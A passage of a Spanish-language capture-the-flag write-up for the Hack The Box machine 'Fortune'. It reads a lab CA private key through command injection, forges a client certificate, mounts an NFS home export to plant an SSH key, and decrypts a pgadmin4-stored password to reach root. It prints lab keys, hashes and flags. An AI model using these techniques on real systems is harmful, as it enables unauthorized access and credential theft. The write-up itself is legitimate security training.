O346jKcnOF/lviF6HmxhUL5pac4XHNYPJhVoKmimYUWi2fJ/1B2PgRrzv/mmlgL7
JOpJNWMUbc8bEf698QziuCXj5R/+Lover058nrvCAnI4I4wUHTGAgOC1J4hbVoYX
EjK1GT+zlnX9+JAqGthxxqQp/YXYk1lgA5xpANJIlxH0gwaTQ4a8HAPBliHnEV0v
XK38+yzRe1/uD3OUWKw+DYD/EmH78QiAr7Yb7K4H1yh5VF9zkLCTN6WYoaSM1Z0T
nb8nv8SUuSwsa/piZvRo7VqzYbDtl8MCAwEAAaNmMGQwHQYDVR0OBBYEFNBS/hId
Md8NPcYbC32/OSwFbZzUMB8GA1UdIwQYMBaAFFOdNrSGE+IcSQJs1UTIogSJ2i5W
MBIGA1UdEwEB/wQIMAYBAf8CAQAwDgYDVR0PAQH/BAQDAgGGMA0GCSqGSIb3DQEB
CwUAA4ICAQAJ0/abFm23OqxhuRPiGr7VfRn8DbsyQ7oVB8zxJsgfgWkXTKuTtJti
zhZSFR8/JMUYhRLwdkjf8w3hA7GKF9VS3kioEDGROtx++ZQc1ljI7owLfDYfhQ08
0CJiXxmwO4XupL23cxu9i9464+knHvqvE1Uhj/L9HO5pVD5uAS2kePnSju7n08gg
miqzREAc0qzehpoJXuS50wJc4otGgU5l+Rsen8giWdR0a1TxKm2UF/wFQbSU+WwY
8F5PquwOz384mmQ/3k6SVj6HStCFb47bHEpvS5mvj2lzJMiLFtYkzSe2fDJJ444I
1Y4UXIOE/nKK/UDw4tOquxcYVD0oJ0lxpFhpSVtRu9R5cqYPJI2POQTj6Ucb7i+3
OpY+NpJ0mjem7/d1yCDtKIbz4pcJoaAtVQVDdzywPTe3LcdnGutvfiYJZJW/ENNG
z3Iw0vkQCeJTsUMg45x88QzAg8IG0jkqT0PEhXD6ul4fAgm0/8BCuEwNuMz9mHc9
DFhdfx5zU8OYUVpw4UB8IC2wbybyW+ftkcsfLngYasH3cZa1GpXq/qDByCW2C8kg
z4mKdO3yVIf087hyfCKWSH9OAH1FEDnhkWbLhkGcJENrIJuO7CNYRyBIjd1jxtUv
HinFDCeM/GeMJr2W154CniHjtXoiEeZ8LRY73qESZBqXukWxbOa7sA==
-----END CERTIFICATE-----
```

```null
[+] Introduce un comando: cat /home/bob/ca/intermediate/private/intermediate.key.pem
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

Con ```openssl``` creo una clave privada

```null
openssl genrsa -out rubbx.key 2048
```

A partir de este un ```Certificate Signing Request```, también conocido como ```CSR```

```null
openssl req -new -key rubbx.key -out rubbx.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Fortune
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:rubbx
Email Address []:rubbx@fortune.htb

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```

Este CSR lo firmo para crear un archivo ```PEM```

```null
openssl x509 -req -in rubbx.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out rubbx.pem -days 365 -sha256
Certificate request self-signature ok
subject=C = AU, ST = Some-State, O = Fortune, CN = rubbx, emailAddress = rubbx@fortune.htb
```

Para que lo pueda interpretar el navegador, tiene que estar en formato ```PFX```

```null
openssl pkcs12 -export -out rubbx.pfx -inkey rubbx.key -in rubbx.pem -certfile intermediate.cert.pem
Enter Export Password:
Verifying - Enter Export Password:
```

Importo el certificado en el navegador, en mi caso tuve que utilizar ```Firefox```

<img src="/writeups/assets/img/Fortune-htb/5.png" alt="">

Al abrir por SSL la web, aparece un mensaje. Se inserta un enlace que permite crear un par de claves SSH

<img src="/writeups/assets/img/Fortune-htb/6.png" alt="">

Obtengo una ```id_rsa``` que me permite conectar como algún usuario

<img src="/writeups/assets/img/Fortune-htb/7.png" alt="">

Si miro de nuevo el ```/etc/passwd```, se puede ver que quien controla ```authpf```

```null
[+] Introduce un comando: cat /etc/passwd | tail -n 1
nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf
```

Gano acceso como este

```null
ssh nfsuser@10.10.10.127 -i id_rsa
The authenticity of host '10.10.10.127 (10.10.10.127)' can't be established.
ED25519 key fingerprint is SHA256:xYk/iFa05KYp2CIxGQzmGA87mfmmHcNA3srRDtVXEEw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.127' (ED25519) to the list of known hosts.

Hello nfsuser. You are authenticated from host "10.10.16.5"
```

Vuelvo a escanear los puertos con ```nmap```

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.127
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-13 10:29 GMT
Nmap scan report for 10.10.10.127
Host is up (0.070s latency).
Not shown: 62928 filtered tcp ports (no-response), 2600 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
711/tcp  open  cisco-tdp
2049/tcp open  nfs
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 26.21 seconds
```

Está abierto el NFS. Enumero los directorios que se están compartiendo

```null
showmount -e 10.10.10.127
Export list for 10.10.10.127:
/home (everyone)
```

Creo una montura en mi equipo

```null
mkdir /mnt/Fortune
```

```null
mount -t nfs 10.10.10.127:/home /mnt/Fortune
Created symlink /run/systemd/system/remote-fs.target.wants/rpc-statd.service → /lib/systemd/system/rpc-statd.service.
```

El directorio ```charlie``` tiene asignado como ```UID``` el 1000, que corresponde con el usuario ```rubbx``` de mi máquina. En caso de convertirme a este, puedo leer lo que hay dentro

```null
su rubbx
```

Introduzco mi clave pública en las ```authorized_keys```

```null
cat ~/.ssh/id_rsa.pub > /mnt/Fortune/charlie/.ssh/authorized_keys
```

Gano acceso como el usuario ```charlie```. Puedo ver la primera flag

```null
ssh charlie@10.10.10.127
The authenticity of host '10.10.10.127 (10.10.10.127)' can't be established.
ED25519 key fingerprint is SHA256:xYk/iFa05KYp2CIxGQzmGA87mfmmHcNA3srRDtVXEEw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.127' (ED25519) to the list of known hosts.
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.
fortune$ cat user.txt                                                                                                                                                                                          
ada0affd040090a6daede65f10737c40
```

# Escalada

En su directorio personal hay un mail

```null
fortune$ cat mbox  
From bob@fortune.htb Sat Nov  3 11:18:51 2018
Return-Path: <bob@fortune.htb>
Delivered-To: charlie@fortune.htb
Received: from localhost (fortune.htb [local])
        by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
        for <charlie@fortune.htb>;
        Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
From:  <bob@fortune.htb>
Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
To: charlie@fortune.htb
Subject: pgadmin4
Message-ID: <196699abe1fed384@fortune.htb>
Status: RO

Hi Charlie,

Thanks for setting-up pgadmin4 for me. Seems to work great so far.
BTW: I set the dba password to the same as root. I hope you don't mind.

Cheers,

Bob
```

La contraseña de la base de datos es la misma que la del usuario ```root```. De antes ví que el directorio donde se encuentra la base de datos es ```/var/appsrv/pgadmin4```

```null
fortune$ ls
pgadmin4.db  pgadmin4.ini sessions     storage
```

Puedo abrirla con ```sqlite3```

```null
fortune$ sqlite3 pgadmin4.db
SQLite version 3.24.0 2018-06-04 19:24:41
Enter ".help" for usage hints.
sqlite> 
```

Listo las tablas

```null
sqlite> .tables
alembic_version              roles_users                
debugger_function_arguments  server                     
keys                         servergroup                
module_preference            setting                    
preference_category          user                       
preferences                  user_preferences           
process                      version                    
role     
```

Y dumpeo los datos

```null
sqlite> select * from user;
1|charlie@fortune.htb|$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ|1|
2|bob@fortune.htb|$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg|1|
```

Estos dos hashes contienen una contraseña muy robusta y no se pueden crackear con ```hashcat```. Dumpeo los datos de la tabla ```server```. Se encuentra una cadena en base64 encriptada

```null
sqlite> select * from server;
1|2|2|fortune|localhost|5432|postgres|dba|utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz||prefer||||||<STORAGE_DIR>/.postgresql/postgresql.crt|<STORAGE_DIR>/.postgresql/postgresql.key|||0||||0||22||0||0|
```

Suponiendo que se utiliza, de alguna manera se tiene que desencriptar, por lo que es probable que en algún sitio se encuentre esta función. En el archivo ```pgadmin4.ini``` aparecen varias rutas de donde se extraen archivos

```null
fortune$ cat pgadmin4.ini
[uwsgi]
chdir           = /usr/local/pgadmin4/pgadmin4-3.4/web/
virtualenv      = /usr/local/pgadmin4/.virtualenvs/pgadmin4
pythonpath      = /usr/local/pgadmin4/.virtualenvs/pgadmin4
wsgi-file       = /usr/local/pgadmin4/pgadmin4-3.4/web/pgAdmin4.wsgi
safe-pidfile    = /var/appsrv/pgadmin4/pgadmin4.pid
fastcgi-socket  = /var/www/run/pgadmin4/pgadmin4.socket
chmod-socket    = 660
master          = true
processes       = 1
callable        = application
vacuum          = true
```

Me dirijo a la primera y filtro de manera recursiva por la cadena ```decrypt```

```null
fortune$ grep -ril "decrypt" .
./pgadmin/browser/server_groups/servers/__init__.py
./pgadmin/browser/server_groups/servers/__pycache__/__init__.cpython-36.pyc
./pgadmin/messages.pot
./pgadmin/translations/de/LC_MESSAGES/messages.mo
./pgadmin/translations/de/LC_MESSAGES/messages.po
./pgadmin/translations/es/LC_MESSAGES/messages.mo
./pgadmin/translations/es/LC_MESSAGES/messages.po
./pgadmin/translations/fr/LC_MESSAGES/messages.mo
./pgadmin/translations/fr/LC_MESSAGES/messages.po
./pgadmin/translations/ja/LC_MESSAGES/messages.mo
./pgadmin/translations/ja/LC_MESSAGES/messages.po
./pgadmin/translations/ko/LC_MESSAGES/messages.mo
./pgadmin/translations/ko/LC_MESSAGES/messages.po
./pgadmin/translations/pl/LC_MESSAGES/messages.mo
./pgadmin/translations/pl/LC_MESSAGES/messages.po
./pgadmin/translations/ru/LC_MESSAGES/messages.mo
./pgadmin/translations/ru/LC_MESSAGES/messages.po
./pgadmin/translations/zh/LC_MESSAGES/messages.mo
./pgadmin/translations/zh/LC_MESSAGES/messages.po
./pgadmin/utils/crypto.py
./pgadmin/utils/driver/psycopg2/connection.py
./pgadmin/utils/driver/psycopg2/server_manager.py
./pgadmin/utils/driver/psycopg2/__pycache__/server_manager.cpython-36.pyc
./pgadmin/utils/driver/psycopg2/__pycache__/connection.cpython-36.pyc
./pgadmin/utils/__pycache__/crypto.cpython-36.pyc
```

El archivo ```./pgadmin/utils/crypto.py``` parece el indicado

```py
##########################################################################
#
# pgAdmin 4 - PostgreSQL Tools
#
# Copyright (C) 2013 - 2018, The pgAdmin Development Team
# This software is released under the PostgreSQL Licence
#
#########################################################################

"""This File Provides Cryptography."""

import base64
import hashlib

from Crypto import Random
from Crypto.Cipher import AES

padding_string = b'}'


def encrypt(plaintext, key):
    """
    Encrypt the plaintext with AES method.

    Parameters:
        plaintext -- String to be encrypted.
        key       -- Key for encryption.
    """

    iv = Random.new().read(AES.block_size)
    cipher = AES.new(pad(key), AES.MODE_CFB, iv)
    # If user has entered non ascii password (Python2)
    # we have to encode it first
    if hasattr(str, 'decode'):
        plaintext = plaintext.encode('utf-8')
    encrypted = base64.b64encode(iv + cipher.encrypt(plaintext))

    return encrypted


def decrypt(ciphertext, key):
    """
    Decrypt the AES encrypted string.

    Parameters:
        ciphertext -- Encrypted string with AES method.
        key        -- key to decrypt the encrypted string.
    """

    global padding_string

    ciphertext = base64.b64decode(ciphertext)
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(pad(key), AES.MODE_CFB, iv)
    decrypted = cipher.decrypt(ciphertext[AES.block_size:])

    return decrypted


def pad(key):
    """Add padding to the key."""

    global padding_string
    str_len = len(key)

    # Key must be maximum 32 bytes long, so take first 32 bytes
    if str_len > 32:
        return key[:32]

    # If key size id 16, 24 or 32 bytes then padding not require
    if str_len == 16 or str_len == 24 or str_len == 32:
        return key

    # Convert bytes to string (python3)
    if not hasattr(str, 'decode'):
        padding_string = padding_string.decode()

    # Add padding to make key 32 bytes long
    return key + ((32 - str_len % 32) * padding_string)


def pqencryptpassword(password, user):
    """
    pqencryptpassword -- to encrypt a password
    This is intended to be used by client applications that wish to send
    commands like ALTER USER joe PASSWORD 'pwd'.  The password need not
    be sent in cleartext if it is encrypted on the client side.  This is
    good because it ensures the cleartext password won't end up in logs,
    pg_stat displays, etc. We export the function so that clients won't
    be dependent on low-level details like whether the enceyption is MD5
    or something else.

    Arguments are the cleartext password, and the SQL name of the user it
    is for.

    Return value is "md5" followed by a 32-hex-digit MD5 checksum..

    Args:
      password:
      user:

    Returns:

    """

    m = hashlib.md5()

    # Place salt at the end because it may be known by users trying to crack
    # the MD5 output.
    # Handling of non-ascii password (Python2)
    if hasattr(str, 'decode'):
        password = password.encode('utf-8')
        user = user.encode('utf-8')
    else:
        password = password.encode()
        user = user.encode()

    m.update(password)
    m.update(user)

    return "md5" + m.hexdigest()
```

Para poder utilizar la función ```decrypt```, hay que proporcionar dos argumentos, ```ciphertext``` y ```key```. Creo una copia a mi equipo, debido a que hay que hacer unas modificaciones

```null
fortune$ cp ./pgadmin/utils/crypto.py /tmp/crypto.py
```

Llamo al final a la función proporcionando el hash del usuario ```bob``` y la ```key```

```py
password = decrypt("utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz", "$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg")

print(password)
```

Ejecuto y consigo la contraseña en texto plano

```null
python2 crypto.py
R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
```

Gano acceso como el usuario ```root``` y puedo ver la segunda flag

```null
fortune# id                                                                                                                                                                                                    
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
fortune# cat /root/root.txt                                                                                                                                                                                    
335af7f02878890aea32d64f7ea3a0f8
```